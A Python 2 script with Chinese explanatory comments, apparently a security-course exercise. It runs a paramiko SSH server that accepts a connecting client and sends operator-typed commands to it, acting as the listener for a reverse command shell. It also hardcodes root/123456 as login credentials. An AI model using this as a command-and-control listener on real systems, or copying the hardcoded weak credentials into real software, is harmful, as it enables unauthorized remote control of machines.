#! /usr/bin/env python
# -*- coding:utf-8 -*-

import socket
import sys
import threading
import paramiko

host_key = paramiko.RSAKey(filename='private_key.key')


class Server(paramiko.ServerInterface):
    def __init__(self):
        # 执行start_server()方法首先会触发Event，如果返回成功，is_active返回True
        self.event = threading.Event()

    # 当is_active返回True，进入到认证阶段
    def check_auth_password(self, username, password):
        if (username == 'root') and (password == '123456'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    # 当认证成功，client会请求打开一个Channel
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED


# 命令行接收ip与port
server = sys.argv[1]
ssh_port = int(sys.argv[2])

# 建立socket
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP socket
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print '[+] Listening for connection ...'
    client, addr = sock.accept()
except Exception, e:
    print '[-] Listen failed: ' + str(e)
    sys.exit(1)
print '[+] Got a connection!'

try:
    # 用sock.accept()返回的socket实例化Transport
    bhSession = paramiko.Transport(client)
    # 添加一个RSA密钥加密会话
    bhSession.add_server_key(host_key)
    server = Server()
    try:
        # 启动SSH服务端
        bhSession.start_server(server=server)
    except paramiko.SSHException, x:
        print '[-] SSH negotiation failed'
    chan = bhSession.accept(20)
    print '[+] Authenticated!'
    print chan.recv(1024)
    chan.send("Welcome to my ssh")
    while True:
        try:
            command = raw_input("Enter command:").strip("\n")
            if command != 'exit':
                chan.send(command)
                print chan.recv(1024) + '\n'
            else:
                chan.send('exit')
                print 'exiting'
                bhSession.close()
                raise Exception('exit')
        except KeyboardInterrupt:
            bhSession.close()
except Exception, e:
    print '[-] Caught exception: ' + str(e)
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)
